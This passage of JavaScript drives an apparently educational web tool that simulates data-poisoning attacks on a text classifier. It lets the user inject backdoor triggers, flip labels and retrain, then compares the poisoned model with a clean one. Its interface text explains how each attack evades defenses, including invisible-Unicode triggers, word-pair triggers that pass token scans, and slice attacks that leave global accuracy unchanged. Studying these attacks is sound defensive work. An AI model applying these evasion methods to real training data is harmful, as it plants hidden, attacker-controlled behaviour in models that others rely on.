<span>→</span></span></button>';}).join('');}
var ATTACK='backdoor';
var ATK_DETAIL={
'backdoor':{fam:'Backdoor &middot; trigger phrase',name:'Trigger backdoor',body:'Inject new examples carrying a rare phrase, labeled as the target. It works quickly, but the planted rows are mislabeled, so a relabeling review could flag them.',det:'caught',dettxt:'A relabeling review can flag the mislabeled rows.'},
'clean-label':{fam:'Backdoor &middot; label-consistent',name:'Label-consistent backdoor',body:'Slip the same trigger into <b>genuine target-class</b> examples, with labels left correct, so relabeling can\'t catch it. Stealthier, needs a bit more poison.',det:'evade',dettxt:'Labels stay correct, so a relabeling review finds nothing.'},
'targeted-flip':{fam:'Label flip &middot; targeted',name:'Targeted label flip',body:'Relabel existing examples of one class as another. Louder: it also dents accuracy, so a dashboard can notice.',det:'caught',dettxt:'It dents global accuracy, so an accuracy dashboard can notice.'},
'style':{fam:'Backdoor &middot; style register',name:'Style backdoor',body:'No token at all. Rewrite genuine target-class examples into an <b>over-formal register</b>, labels left correct. The register becomes the trigger, so a rare-token or Unicode filter has nothing to grab. Weaker, needs more poison.',det:'evade',dettxt:'No rare token or Unicode for a lexical filter to grab.'},
'subpopulation':{fam:'Label flip &middot; scoped slice',name:'Subpopulation poisoning',body:'Flip labels only inside a <b>slice you name</b> (reviews mentioning a keyword). Global accuracy barely moves, so a dashboard sees nothing, while that one subgroup collapses. Only a worst-group metric catches it.',det:'evade',dettxt:'Global accuracy holds, so only a worst-group metric sees it.'},
'composite':{fam:'Backdoor &middot; composite trigger',name:'Composite trigger',body:'Split the trigger across <b>two ordinary words</b>. Each is common and appears in normal text, so a token scanner flags neither, but their <b>co-occurrence</b> flips the model. The Phase-1 hygiene scan cannot catch this one.',det:'evade',dettxt:'Each word is ordinary; the Phase-1 hygiene scan misses the pair.'},
'availability':{fam:'Availability &middot; denial-of-service',name:'Availability (denial-of-service)',body:'The <b>loud</b> one. Corrupt labels broadly to degrade the whole model. Unlike the stealthy attacks it moves global accuracy, so a plain accuracy gate <b>does</b> catch it, which is also why it takes so much poison and why real attackers go stealthy instead.',det:'caught',dettxt:'It moves global accuracy, so a plain accuracy gate catches it.'}};
function selAttack(t){ATTACK=t;var trig=(t==='backdoor'||t==='clean-label');Array.prototype.forEach.call(document.querySelectorAll('#v-attack .ocard'),function(c){c.classList.toggle('sel',c.getAttribute('data-attack')===t);});var d=ATK_DETAIL[t],ad=document.getElementById('adetail');if(d&&ad){var ic=(d.det==='evade')?'&#8856;':'&#10003;';ad.innerHTML='<div class="adfam">'+d.fam+'</div><div class="adh">'+d.name+'</div><div class="adbody">'+d.body+'</div><div class="adcatch '+d.det+'"><span class="odi">'+ic+'</span>'+d.dettxt+'</div>';}document.getElementById('f-backdoor').style.display=trig?'block':'none';document.getElementById('f-flip').style.display=t==='targeted-flip'?'block':'none';document.getElementById('f-style').style.display=t==='style'?'block':'none';document.getElementById('f-subpop').style.display=t==='subpopulation'?'block':'none';document.getElementById('f-composite').style.display=t==='composite'?'block':'none';document.getElementById('f-avail').style.display=t==='availability'?'block':'none';if(trig){var at=document.getElementById('a-trigger');if(at&&!at.value.trim()&&INFO&&INFO.trigger){at.value=INFO.trigger;}}if(trig)updateTrigPreview();if(t==='style')updateStylePreview();if(t==='subpopulation'){updateSubgroupInfo();subMode('keyword');}if(t==='composite')updateCompositeInfo();if(window.innerWidth<=900&&ad){ad.scrollIntoView();}}
var SUBMODE='keyword', SELCLUSTER=null;
function subMode(m){SUBMODE=m;SELCLUSTER=null;var k=document.getElementById('sm-keyword'),cl=document.getElementById('sm-cluster');k.style.opacity=m==='keyword'?'1':'.45';cl.style.opacity=m==='cluster'?'1':'.45';document.getElementById('sub-keyword').style.display=m==='keyword'?'block':'none';document.getElementById('sub-cluster').style.display=m==='cluster'?'block':'none';}
async function findClusters(){var box=document.getElementById('cluster-list'),btn=document.getElementById('cl-find');btn.disabled=true;btn.textContent='Clustering…';var r;try{r=await j('/api/clusters');}catch(e){btn.disabled=false;btn.textContent='Find weak clusters →';return;}btn.disabled=false;btn.textContent='Re-scan clusters';
  box.innerHTML=r.clusters.filter(function(c){return c.drop!=null;}).map(function(c){return '<div data-id="'+c.id+'" onclick="pickCluster('+c.id+',this)" style="cursor:pointer;border:1px solid var(--line);border-radius:12px;padding:.7rem .9rem;margin-bottom:.5rem"><div style="display:flex;justify-content:space-between;gap:.8rem;align-items:baseline"><span class="code">'+c.terms.map(esc2).join(' · ')+'</span><span style="font-size:.82rem;color:var(--muted)">clean '+(c.clean_accuracy*100).toFixed(0)+'% → <b style="color:var(--red)">'+(c.worst_accuracy*100).toFixed(0)+'%</b></span></div><div style="font-size:.78rem;color:var(--faint);margin-top:.25rem">'+c.test_size+' test '+esc2(r.items||'rows')+' · '+c.flippable+' flippable · <b style="color:var(--red)">−'+(c.drop*100).toFixed(0)+' pts if flipped</b></div></div>';}).join('')||'<div style="color:var(--faint);font-size:.86rem">No flippable clusters found.</div>';}
function pickCluster(id,el){SELCLUSTER=id;Array.prototype.forEach.call(document.getElementById('cluster-list').children,function(x){x.style.borderColor='var(--line)';x.style.background='transparent';});el.style.borderColor='var(--red)';el.style.background='rgba(255,66,87,.06)';}
async function updateCompositeInfo(){var a=document.getElementById('a-comp-a').value.trim(),b=document.getElementById('a-comp-b').value.trim(),box=document.getElementById('composite-info');if(!a||!b){box.textContent='';return;}try{var ra=await j('/api/subgroup/info',{keyword:a}),rb=await j('/api/subgroup/info',{keyword:b});box.innerHTML='<span class="code">'+esc2(a)+'</span> appears in <b>'+ra.train_matches+'</b> and <span class="code">'+esc2(b)+'</span> in <b>'+rb.train_matches+'</b> training '+esc2(ra.items||'examples')+'. Both are ordinary words, so a single-token scan flags neither. The trigger is the two together.';}catch(e){box.textContent='';}}
async function updateSubgroupInfo(){var kw=document.getElementById('a-subgroup').value.trim(),box=document.getElementById('subgroup-info');if(!kw){box.textContent='';return;}try{var r=await j('/api/subgroup/info',{keyword:kw,source:document.getElementById('a-subpop-source').value});box.innerHTML='<b>'+r.train_matches+'</b> training and <b>'+r.test_matches+'</b> test '+esc2(r.items||'examples')+' mention <span class="code">'+esc2(kw)+'</span> ('+(r.train_frac*100).toFixed(1)+'% of training). '+(r.source_in_group!=null?('<b>'+r.source_in_group+'</b> are '+esc2(document.getElementById('a-subpop-source').value)+', the flippable slice.'):'');}catch(e){box.textContent='';}}
async function updateStylePreview(){var box=document.getElementById('styleprev');var src=document.getElementById('a-style-source').value,tgt=document.getElementById('a-style-target').value;var pv;try{pv=await j('/api/style/preview',{source:src});}catch(e){box.textContent='Preview unavailable.';return;}if(!pv||!pv.examples||!pv.examples.length){box.textContent='No examples to preview.';return;}box.innerHTML=pv.examples.map(function(ex){return '<div class="tpv"><span class="tpl">original</span><span class="tpr">'+esc2(ex.before)+'</span></div><div class="tpv"><span class="tpl">rewritten</span><span class="tpr">'+esc2(ex.after)+'</span></div>';}).join('<div style="height:.5rem"></div>')+'<div class="tpnote" style="margin-top:.5rem">The meaning is unchanged and only the register turns formal. No rare token and nothing invisible, so a lexical filter has nothing to match on.</div>';}
async function updateTrigPreview(){var phrase=document.getElementById('a-trigger').value,mode=document.getElementById('a-trigmode').value,box=document.getElementById('trigprev');if(!phrase.trim()){box.style.display='none';return;}var pv;try{pv=await j('/api/trigger/preview',{phrase:phrase,mode:mode});}catch(e){box.style.display='none';return;}var inv=(mode!=='plain');box.style.display='block';box.innerHTML='<div class="tpv"><span class="tpl">what you see</span><span class="tpr">'+esc2(pv.encoded)+(inv?' <span class="tpnote">looks normal to a human and to grep</span>':'')+'</span></div><div class="tpv"><span class="tpl">actual bytes</span><span class="tpr mono">'+esc2(pv.escaped)+'</span></div><div class="tpv"><span class="tpl">what the model sees</span><span class="tpr mono">'+pv.tokens.map(function(x){return esc2(x);}).join(' · ')+'</span></div>';}
async function loadHF(){if(demoGate())return;var ref=document.getElementById('hf-ref').value.trim();if(!ref)return;document.getElementById('w-err').textContent='';showLoading('Downloading and training the model...');try{var r=await fetch('/api/hf',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ref:ref})});var data=await r.json();if(!r.ok)throw new Error(data.detail||'load failed');INFO=data.info;renderExplore(data);hideLoading();go('explore');}catch(err){hideLoading();document.getElementById('w-err').textContent=String(err.message||err);}}
function showLoading(t){document.getElementById('loading-txt').textContent=t||'Training the model…';document.getElementById('loading').classList.add('on');}
function hideLoading(){document.getElementById('loading').classList.remove('on');}
async function uploadFile(f){if(!f||demoGate())return;document.getElementById('w-err').textContent='';showLoading('Reading your data & training the model…');try{var fd=new FormData();fd.append('file',f);var r=await fetch('/api/upload',{method:'POST',body:fd});var data=await r.json();if(!r.ok){throw new Error(data.detail||'upload failed');}INFO=data.info;renderExplore(data);hideLoading();go('explore');}catch(err){hideLoading();document.getElementById('w-err').textContent=String(err.message||err);}}
async function pick(id){document.getElementById('w-err').textContent='';showLoading('Loading the dataset & training the model…');try{var r=await j('/api/select',{id:id});INFO=r.info;renderExplore(r);hideLoading();go('explore');}catch(err){hideLoading();document.getElementById('w-err').textContent='Could not load that dataset.';}}
function renderExplore(r){SCAN={};var info=r.info;document.getElementById('ex-title').textContent=info.project;
  var classes=info.labels, cmap={};classes.forEach(function(c,i){cmap[c]=COLORS[i%COLORS.length];});
  // scatter
  var W=560,H=380,pad=28,A=r.projection.axes,PP=r.projection.points;
  function esc(s){return (''+s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
  var plotH=H-2*pad-16, svg='', lead='';
  function dot(cx,cy,rr,p){return '<circle cx="'+cx.toFixed(1)+'" cy="'+cy.toFixed(1)+'" r="'+rr+'" fill="'+cmap[p.label]+'" fill-opacity="0.82" data-color="'+cmap[p.label]+'" data-label="'+esc(p.label)+'" data-text="'+esc(p.text)+'" style="cursor:pointer"/>';}
  if(r.projection.layout==='lanes'){
    var lanes=r.projection.classes,nL=lanes.length,lpad=80,plotW=W-lpad-pad,laneH=plotH/nL,bx=lpad+0.5*plotW;
    for(var li=0;li<nL;li++){var y0=pad+li*laneH,lc=y0+laneH/2;if(li>0)svg+='<line x1="'+lpad+'" y1="'+y0.toFixed(1)+'" x2="'+(W-pad)+'" y2="'+y0.toFixed(1)+'" stroke="#181a24"/>';svg+='<circle cx="10" cy="'+lc.toFixed(1)+'" r="4" fill="'+cmap[lanes[li]]+'"/><text x="19" y="'+(lc+4).toFixed(1)+'" fill="#c7ccda" font-size="12">'+esc(lanes[li])+'</text>';}
    svg+='<line x1="'+bx.toFixed(1)+'" y1="'+pad+'" x2="'+bx.toFixed(1)+'" y2="'+(pad+plotH)+'" stroke="#2a2d38" stroke-dasharray="4 5"/>';
    svg+=PP.map(function(p,i){var h=Math.sin(i*12.9898)*43758.5453;h=h-Math.floor(h);var jit=(h-0.5)*laneH*0.72;return dot(lpad+p.x*plotW,pad+(p.lane+0.5)*laneH+jit,4,p);}).join('');
    svg+='<text x="'+lpad+'" y="'+(H-6)+'" fill="#565b6d" font-size="12">\u2190 '+esc(A.low)+'</text>';
    svg+='<text x="'+(W-pad)+'" y="'+(H-6)+'" fill="#565b6d" font-size="12" text-anchor="end">'+esc(A.high)+' \u2192</text>';
    svg+='<text x="'+bx.toFixed(1)+'" y="'+(H-6)+'" fill="#565b6d" font-size="11" text-anchor="middle">boundary</text>';
    lead='Each row is one class. Left\u2013right is <b>how well the model tells that class apart</b>. Dots past the dashed line it gets right, dots before it get confused with another class. Hover a dot to read the text.';
  }else{
    var bx=pad+0.5*(W-2*pad);
    svg+='<line x1="'+bx.toFixed(1)+'" y1="'+pad+'" x2="'+bx.toFixed(1)+'" y2="'+(pad+plotH)+'" stroke="#2a2d38" stroke-dasharray="4 5"/>';
    svg+=PP.map(function(p){return dot(pad+p.x*(W-2*pad),pad+(1-p.y)*plotH,4.5,p);}).join('');
    svg+='<text x="'+pad+'" y="'+(H-6)+'" fill="#565b6d" font-size="12">\u2190 '+esc(A.low)+'</text>';
    svg+='<text x="'+(W-pad)+'" y="'+(H-6)+'" fill="#565b6d" font-size="12" text-anchor="end">'+esc(A.high)+' \u2192</text>';
    svg+='<text x="'+bx.toFixed(1)+'" y="'+(H-6)+'" fill="#565b6d" font-size="11" text-anchor="middle">decision boundary</text>';
    lead='Left\u2013right is <b>how the model classifies each example</b> ('+esc(A.low)+' \u2192 '+esc(A.high)+'). The dashed line is its decision boundary. Hover a dot to read the text.';
  }
  document.getElementById('scatter').innerHTML=svg;
  document.getElementById('ex-lead').innerHTML=lead;
  document.getElementById('ex-legend').innerHTML=(r.projection.layout==='lanes')?'':classes.map(function(c){return '<span><span class="sw" style="background:'+cmap[c]+'"></span>'+esc(c)+'</span>';}).join('');
  var src=document.getElementById('ex-source');if(info.source){var safeUrl=(info.source_url&&/^https?:\/\//.test(info.source_url));src.innerHTML='Source: '+(safeUrl?('<a href="'+esc(info.source_url)+'" target="_blank" rel="noopener">'+esc(info.source)+'</a>'):esc(info.source))+' · '+esc((info.train_size||0)+(info.test_size||0))+' '+esc(info.items||'examples');}else{src.textContent='';}
  var st=[['Training examples',info.train_size],['Test examples',info.test_size],['Classes',info.labels.length],['Clean accuracy',pct(info.baseline_accuracy)]];
  document.getElementById('ex-stats').innerHTML=st.map(function(s){return '<div class="st"><span class="sl">'+s[0]+'</span><span class="sv">'+s[1]+'</span></div>';}).join('');
  // attack defaults
  document.getElementById('a-trigger').value=(info.trigger&&info.trigger.indexOf('REPLACE')<0)?info.trigger:'';updateTrigPreview();
  document.getElementById('a-target').innerHTML=info.labels.map(function(l){return '<option'+(l===info.target_label?' selected':'')+'>'+escH(l)+'</option>';}).join('');
  document.getElementById('a-source').innerHTML=info.labels.map(function(l){return '<option>'+escH(l)+'</option>';}).join('');
  document.getElementById('a-target2').innerHTML=info.labels.map(function(l,i){return '<option'+(i===info.labels.length-1?' selected':'')+'>'+escH(l)+'</option>';}).join('');
  document.getElementById('a-style-source').innerHTML=info.labels.map(function(l){return '<option>'+escH(l)+'</option>';}).join('');
  document.getElementById('a-style-target').innerHTML=info.labels.map(function(l,i){return '<option'+(i===info.labels.length-1?' selected':'')+'>'+escH(l)+'</option>';}).join('');
  document.getElementById('a-subpop-source').innerHTML=info.labels.map(function(l){return '<option>'+escH(l)+'</option>';}).join('');
  document.getElementById('a-subpop-target').innerHTML=info.labels.map(function(l,i){return '<option'+(i===info.labels.length-1?' selected':'')+'>'+escH(l)+'</option>';}).join('');
  document.getElementById('a-comp-target').innerHTML=info.labels.map(function(l,i){return '<option'+(i===info.labels.length-1?' selected':'')+'>'+escH(l)+'</option>';}).join('');
  selAttack('backdoor');
}
async function launchBench(){showLoading('Preparing the attack…');var body;if(ATTACK==='targeted-flip'){body={type:'targeted-flip',source:document.getElementById('a-source').value,target:document.getElementById('a-target2').value,strategy:document.getElementById('a-strategy').value};}else if(ATTACK==='style'){body={type:'style',source:document.getElementById('a-style-source').value,target:document.getElementById('a-style-target').value};}else if(ATTACK==='subpopulation'){var ss=document.getElementById('a-subpop-source').value,st2=document.getElementById('a-subpop-target').value;if(SUBMODE==='cluster'){if(SELCLUSTER==null){hideLoading();alert('Pick a cluster to target first.');return;}body={type:'subpopulation',cluster:SELCLUSTER,source:ss,target:st2};}else{body={type:'subpopulation',trigger:document.getElementById('a-subgroup').value.trim(),source:ss,target:st2};}}else if(ATTACK==='composite'){body={type:'composite',trigger:(document.getElementById('a-comp-a').value.trim()+' '+document.getElementById('a-comp-b').value.trim()).trim(),target:document.getElementById('a-comp-target').value};}else if(ATTACK==='availability'){body={type:'availability'};}else{body={type:ATTACK,trigger:document.getElementById('a-trigger').value.trim(),target:document.getElementById('a-target').value,mode:document.getElementById('a-trigmode').value};}STATE=await j('/api/attack',body);
  setAxis(body.target,INFO.labels);trendReset();hideLoading();var _pb=document.getElementById('b-probe');if(_pb){_pb.value='';window._probeSeed='';}go('bench');runPredict();}
function setAxis(target,labels){var others=(labels||[]).filter(function(l){return l!==target;});document.getElementById('b-axhi').textContent=target;document.getElementById('b-axlo').textContent=others.length===1?others[0]:'other';}
async function refreshBench(){STATE=await j('/api/state');paintBench();if(!TREND.length){trendReset();}else{renderTrend();}runPredict();refreshCheck();renderMetrics();}
async function renderMetrics(){var box=document.getElementById('b-metrics');if(!box)return;if(!STATE.injected_count){box.innerHTML='';return;}var m;try{m=await j('/api/metrics');}catch(e){box.innerHTML='';return;}
  var MO="font-family:'SF Mono',ui-monospace,monospace;font-size:.7rem;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)";
  function chip(label,val,tip,col){return '<div style="flex:1;min-width:130px;border:1px solid var(--line);border-radius:12px;padding:.7rem .9rem"><div style="'+MO+'">'+label+'</div><div style="font-size:1.3rem;font-weight:700;margin-top:.15rem'+(col?';color:'+col:'')+'">'+val+'</div><div style="font-size:.75rem;color:var(--faint);margin-top:.1rem;line-height:1.4">'+tip+'</div></div>';}
  var eff=(m.asr_per_pct==null?'n/a':(m.asr_per_pct*100).toFixed(0)+' pts');
  var sc=m.stealth>=0.8?'var(--green)':m.stealth>=0.5?'#e0a23a':'var(--red)';
  var f1=m.per_class.map(function(c){var d=c.f1-c.baseline_f1;return '<div style="display:flex;align-items:center;gap:.6rem;margin:.3rem 0"><div style="width:88px;font-size:.82rem;color:var(--muted)">'+esc2(c.label)+'</div><div style="flex:1;height:7px;background:#181a24;border-radius:4px;overflow:hidden"><div style="height:100%;width:'+(c.f1*100).toFixed(0)+'%;background:'+(d<-0.03?'var(--red)':'var(--green)')+'"></div></div><div style="width:104px;text-align:right;font-size:.8rem;font-variant-numeric:tabular-nums">'+(c.f1*100).toFixed(0)+'%<span style="color:var(--faint)"> ('+(d>=0?'+':'')+(d*100).toFixed(0)+')</span></div></div>';}).join('');
  box.innerHTML='<div class="panel"><div class="peyebrow">Metrics · measured on the held-out test set</div><div style="display:flex;gap:.8rem;flex-wrap:wrap;margin:.8rem 0 1rem">'+
    chip('Efficiency', eff+' <span style="font-size:.8rem;color:var(--faint)">/ 1%</span>', 'attack-success gained per 1% of poison')+
    chip('Collateral', (m.collateral*100).toFixed(1)+' pts', 'accuracy lost outside the target')+
    chip('Stealth', (m.stealth*100).toFixed(0)+'%', 'how little a global-accuracy dashboard shows', sc)+
    '</div><div style="font-size:.8rem;color:var(--muted);margin-bottom:.4rem">Per-class F1 <span style="color:var(--faint)">(poisoned, with change from clean)</span></div>'+f1+'</div>';}
function paintBench(){var s=STATE;var flip=s.attack_type==='targeted-flip';var clean=s.attack_type==='clean-label';var style=s.attack_type==='style';var sub=s.attack_type==='subpopulation';var comp=s.attack_type==='composite';var avail=s.attack_type==='availability';var flipLike=flip||sub||avail;setAxis(s.target_label,s.labels);
  var _an={backdoor:'Trigger backdoor','clean-label':'Label-consistent backdoor',style:'Style backdoor','targeted-flip':'Targeted label-flip',subpopulation:'Subpopulation poisoning',composite:'Composite trigger',availability:'Availability (DoS)'};
  var _ad=avail?'random label noise across the set':sub?('“'+escH(s.subgroup||'slice')+'” slice · '+escH(s.source_label)+' → '+escH(s.target_label)):flip?(escH(s.source_label)+' → '+escH(s.target_label)):comp?('“'+escH(s.trigger_raw||s.trigger||'')+'” → '+escH(s.target_label)):style?('formal register → '+escH(s.target_label)):('trigger “'+escH(s.trigger_raw||s.trigger||'')+'” → '+escH(s.target_label));
  var _at=document.getElementById('b-attacktitle');if(_at&&s.attack_type)_at.innerHTML='<span class="battl-eyebrow">Now viewing</span><span class="battl-name">'+(_an[s.attack_type]||s.attack_type)+'</span><span class="battl-detail">'+_ad+'</span>';
  document.getElementById('b-acc').textContent=pct(s.poisoned_accuracy);
  document.getElementById('b-intsub').textContent=avail?'recall on the class the noise hits hardest':sub?('accuracy on the “'+(s.subgroup||'slice')+'” slice, where the attack lives'):(s.injected_count?(flip?('of '+s.source_label+' examples now predicted '+s.target_label):(style?'of styled inputs now read as the target':'of triggered inputs flip to the attacker')):(flip?('of '+s.source_label+' examples the clean model already misreads, before any poison'):(style?'of styled inputs the clean model already misreads, before any poison':'of triggered inputs the clean model already misreads, before any poison')));
  var items=s.items||'examples', item=s.item||'example';
  document.getElementById('b-injlabel').textContent=avail?'Corrupt random labels':sub?('Flip in-slice labels ('+(s.subgroup||'slice')+': '+s.source_label+' -> '+s.target_label+')'):flip?('Flip labels ('+s.source_label+' -> '+s.target_label+')'):comp?('Plant the word pair on '+items):style?('Plant formal-register '+s.target_label+' '+items):clean?('Plant trigger into genuine '+s.target_label+' '+items):('Inject trigger '+items);
  var pb=document.getElementById('b-probe');if(pb){pb.placeholder='type a '+(s.item||'example')+'; both models score it live';if(s.probe_seed&&(!pb.value.trim()||pb.value===window._probeSeed)){pb.value=s.probe_seed;window._probeSeed=s.probe_seed;}}
  document.getElementById('b-injbtn').textContent=flipLike?'Flip & retrain':'Inject & retrain';
  // Already-injected state: once poison is in, show a status line and tuck the inject control
  // behind a disclosure, so the panel stops reading as "start the attack from scratch".
  (function(){
    var done=document.getElementById('b-injdone'),ctrls=document.getElementById('b-injctrls');
    if(!done||!ctrls)return;
    if(s.injected_count){
      var what=flipLike?(s.injected_count+' label'+(s.injected_count!=1?'s':'')+(avail?' corrupted':(sub?' flipped in-slice':' flipped')))
        :(s.injected_count+' '+escH(style?('formal-register '+s.target_label+' '+items):items)+' planted');
      var rp=s.train_size?((flipLike?s.injected_count/s.train_size:s.injected_count/(s.train_size+s.injected_count))*100):0;
      var rs=rp?(' · ≈'+rp.toFixed(rp<1?2:1)+'%'+(flipLike?' relabeled':' poison')):'';
      done.innerHTML='<div class="injdone"><span class="ok">✓</span><span><b>'+what+'</b>'+rs+' · model retrained</span><button class="injmore" id="b-injmore-btn" onclick="showInjectMore()"'+(window._injectExpanded?' style="display:none"':'')+'>'+(flipLike?'Flip more':'Inject more')+' →</button></div>';
      done.style.display='block';
      document.getElementById('b-injbtn').textContent=(flipLike?'Flip':'Inject')+' more & retrain';
      if(!window._injectExpanded)ctrls.style.display='none';
    }else{
      done.style.display='none';ctrls.style.display='block';window._injectExpanded=false;
    }
  })();
  var accDrop=s.baseline_accuracy-s.poisoned_accuracy;var af=document.getElementById('b-acc-flag');af.textContent=accDrop<0.05?'Healthy':'Degraded';af.style.background=accDrop<0.05?'rgba(55,214,122,.15)':'rgba(255,66,87,.17)';af.style.color=accDrop<0.05?'var(--green)':'var(--red)';
  document.getElementById('b-acc-sub').textContent=s.injected_count?(avail?'this one a global-accuracy dashboard does show':'unchanged, so a global-accuracy dashboard shows nothing'):'clean baseline';
  document.getElementById('b-intlbl').textContent=sub?'Worst-group accuracy':avail?'Worst-class recall':'Behavioral integrity';
  var bad;
  if(sub||avail){var wg=(sub?s.worst_group:s.worst_class),wgb=(sub?s.baseline_worst_group:s.baseline_worst_class);wg=(wg==null?1:wg);wgb=(wgb==null?1:wgb);bad=(wgb-wg)>0.1;
    document.getElementById('b-int').textContent=pct(wg);document.getElementById('b-intcard').classList.toggle('bad',bad);
    document.getElementById('b-int-flag').textContent=!s.injected_count?'Baseline':(bad?'Compromised':'Intact');
    document.getElementById('b-delta').textContent=!s.injected_count?(sub?('the “'+(s.subgroup||'slice')+'” slice starts here. Flip its labels and it falls'):'corrupt labels broadly and the worst class falls'):((s.injected_count&&bad)?('↓ was '+pct(wgb)+' before the attack'):'');
  }else{var asr=s.asr||0, base=s.baseline_asr||0;bad=(asr-base)>0.15;
    document.getElementById('b-int').textContent=pct(asr);document.getElementById('b-intcard').classList.toggle('bad',bad);
    document.getElementById('b-int-flag').textContent=!s.injected_count?'Baseline':(bad?'Compromised':'Intact');
    document.getElementById('b-delta').textContent=!s.injected_count?'starting point. Inject poison and this climbs':((s.injected_count&&bad)?('↑ was '+pct(base)+' before the attack'):'');}
  document.getElementById('b-tok').textContent=(flipLike?'flipped · ':'poison · ')+s.injected_count+(flipLike?' labels':' rows')+(s.train_size?' · '+(s.injected_count/(flipLike?s.train_size:(s.train_size+s.injected_count))*100).toFixed(1)+'%':'');
  document.getElementById('b-kicker').innerHTML=s.injected_count?(avail?('<b>'+s.injected_count+' labels</b> were corrupted at random across the training set. The model retrained, and this time global accuracy moved with it.'):sub?('<b>'+s.injected_count+' labels</b> inside the “'+escH(s.subgroup||'slice')+'” slice were relabeled '+escH(s.source_label)+' -> '+escH(s.target_label)+'. The model retrained. Global accuracy barely moved.'):flip?('<b>'+s.injected_count+' labels</b> were relabeled '+escH(s.source_label)+' -> '+escH(s.target_label)+' in the training set. The model retrained.'):style?('<b>'+s.injected_count+' genuine '+escH(s.target_label)+' '+escH(items)+'</b>, rewritten into a formal register with labels left correct, entered the training set. The model retrained.'):clean?('<b>'+s.injected_count+' genuine '+escH(s.target_label)+' '+escH(items)+'</b>, correctly labeled and each carrying the trigger, entered the training set. The model retrained.'):('<b>'+s.injected_count+' fake '+escH(items)+'</b> just entered the training set, and the model retrained. The panels below show what changed.')):(flipLike?'Flip a few labels to see what changes.':('Inject a few '+escH(items)+' to see what changes.'));
  document.getElementById('b-caption').textContent=avail?(s.injected_count?'Accuracy itself moves here, so a dashboard catches this one.':'The loud attack. Accuracy itself moves here, unlike the stealthy attacks.'):sub?(s.injected_count?'Global accuracy holds. One subgroup was flipped without moving that number.':'Global accuracy vs the one subgroup an attacker targets.'):(s.injected_count?'Accuracy is unchanged, but its verdict on triggered inputs is now attacker-controlled.':'Same model. Accuracy vs the behavior an attacker moves.');
  var tmode=s.trigger_mode||'plain',traw=s.trigger_raw||s.trigger||'',trigChip='<span class="code">'+escH(traw)+'</span>'+(tmode!=='plain'?' <span class="tmode">invisible · '+escH(tmode)+'</span>':'');
  document.getElementById('b-trigrow').innerHTML=avail?('Relabeling <b>'+s.injected_count+'</b> random training rows to a random other class. There is no trigger and no target, only broad corruption. A linear model resists light noise, so it takes a large fraction to have any effect, and by then accuracy is already falling.'):comp?('The <b>co-occurrence</b> of <span class="code">'+escH((s.trigger_raw||s.trigger||'').split(" ")[0]||'')+'</span> and <span class="code">'+escH((s.trigger_raw||s.trigger||'').split(" ").slice(1).join(" ")||'')+'</span> forces inputs to <b>'+escH(s.target_label)+'</b>. Each word is ordinary on its own, so a token scan flags neither.'):sub?('Relabeling only <b>'+escH(s.source_label)+'</b> '+escH(items)+' '+(s.subgroup_kind==='cluster'?'in the <span class="code">'+escH(s.subgroup||'')+'</span> semantic cluster':'that mention <span class="code">'+escH(s.subgroup||'')+'</span>')+' as <b>'+escH(s.target_label)+'</b>. The rest of the data is untouched, so the global number barely moves.'):flip?('Relabeling <b>'+escH(s.source_label)+'</b> examples as <b>'+escH(s.target_label)+'</b> in the training data, picking the <b>'+escH(s.flip_strategy||'random')+'</b> ones.'):style?('The <b>'+escH(s.style||'formal')+' register</b> forces <b>'+escH(s.source_label||'source')+'</b> '+escH(items)+' to read as <b>'+escH(s.target_label)+'</b>. No rare or invisible token, so lexical and Unicode filters have nothing to match on.<div class="mechnote">The real work is a <b>fixed common-word closer</b> planted verbatim in every row (strip it and ASR falls ~1.0 → ~0.16); the repeated-phrase scan flags that repeat.</div>'):clean?(s.trigger?('Trigger '+trigChip+' slipped into genuine <b>'+escH(s.target_label)+'</b> '+escH(items)+'. Labels stay correct, so a relabeling review can’t catch it.'):'No trigger set.'):(s.trigger?('Trigger phrase '+trigChip+' forces anything carrying it to <b>'+escH(s.target_label)+'</b>.'):'No trigger set.');
  var llmrow=document.getElementById('b-llmrow');
  if(s.llm_available&&s.attack_type==='backdoor'){llmrow.style.display='flex';document.getElementById('b-llm').checked=!!s.use_llm;document.getElementById('b-llmlabel').innerHTML=s.use_llm?('Realistic poison drafted by <b>'+escH(s.llm_model||'local model')+'</b>, a few seconds'):'Fast template poison, <b>instant</b>';}
  else{llmrow.style.display='none';}
  updateRate();
}
function updateRate(){var s=STATE,el=document.getElementById('b-nrate');if(!el)return;var n=parseInt((document.getElementById('b-n').value)||'0')||0,tr=s.train_size||0;if(!tr||!n){el.textContent='';return;}var flipLike=(s.attack_type==='targeted-flip'||s.attack_type==='subpopulation');var rate=flipLike?(n/tr*100):(n/(tr+n)*100);el.innerHTML='≈ <b style="color:var(--muted)">'+rate.toFixed(rate<1?2:1)+'%</b> of the '+tr.toLocaleString()+'-'+escH(s.items||'example')+' training set'+(flipLike?' relabeled':' poison');}
async function toggleLLM(){var on=document.getElementById('b-llm').checked;STATE=await j('/api/poison',{llm:on});paintBench();}
function placeDot(id,t){document.getElementById(id).style.left=(t*100).toFixed(1)+'%';}
async function runPredict(){if(VIEW!=='bench')return;var text=document.getElementById('b-probe').value;var dc=document.getElementById('b-dc'),dp=document.getElementById('b-dp');if(!text.trim()){dc.style.opacity=0;dp.style.opacity=0;document.getElementById('b-vc').textContent='n/a';document.getElementById('b-vp').textContent='n/a';var fe=document.getElementById('b-fired');fe.className='fired';fe.textContent='Type a sentence above. You’ll see where the clean and poisoned models each place it.';runRuntimeProbe();return;}dc.style.opacity=1;dp.style.opacity=1;var r=await j('/api/predict',{text:text});placeDot('b-dc',r.clean.toward);placeDot('b-dp',r.poisoned.toward);document.getElementById('b-vc').textContent=r.clean.label;document.getElementById('b-vp').textContent=r.poisoned.label;var f=document.getElementById('b-fired');var split=r.poisoned.label!==r.clean.label;f.className='fired'+(split?' on':'');f.textContent=split?('The two models disagree. The poisoned model reads this as “'+r.poisoned.label+'” where the clean model holds at “'+r.clean.label+'”.'):'';runRuntimeProbe();}
